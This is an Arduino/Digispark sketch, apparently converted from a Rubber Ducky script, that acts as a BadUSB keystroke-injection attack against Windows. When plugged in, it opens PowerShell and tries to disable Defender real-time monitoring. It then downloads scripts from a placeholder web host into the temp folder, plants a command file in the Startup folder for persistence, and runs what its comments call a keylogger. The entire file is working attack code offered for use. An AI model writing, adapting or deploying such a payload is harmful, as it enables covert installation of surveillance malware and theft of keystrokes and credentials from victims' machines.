// Converted using digiQuack by CedArctic (https://github.com/CedArctic/digiQuack) 

#include "DigiKeyboard.h"

void setup() {}

void loop() {
	DigiKeyboard.sendKeyStroke(0);
	// STAGE 1
	// open runbox
	DigiKeyboard.delay(1000);
	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
	DigiKeyboard.delay(200);
	DigiKeyboard.print("powershell");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(300);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// STAGE 2
	// attempts to disable defender
	DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true;");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(200);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// STAGE 3
	// downloading files from the web and storing them in the temp folder
	DigiKeyboard.print("$web = \"https://example.com\"; cd $env:temp; ");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(100);
	DigiKeyboard.print("Invoke-WebRequest \"$web/p.ps1\" -OutFile \"$env:temp\\p.ps1\";");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(300);
	DigiKeyboard.print("Invoke-WebRequest \"$web/l.ps1\" -OutFile \"$env:temp\\l.ps1\";");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(300);
	DigiKeyboard.print("Invoke-WebRequest \"$web/c.cmd\" -OutFile \"C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/c.cmd\";");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(300);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// STAGE 4
	// run keylogger
	DigiKeyboard.print("cd \"C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup\"; .\\c.cmd; exit;");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	// STAGE 5
	// deploy
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
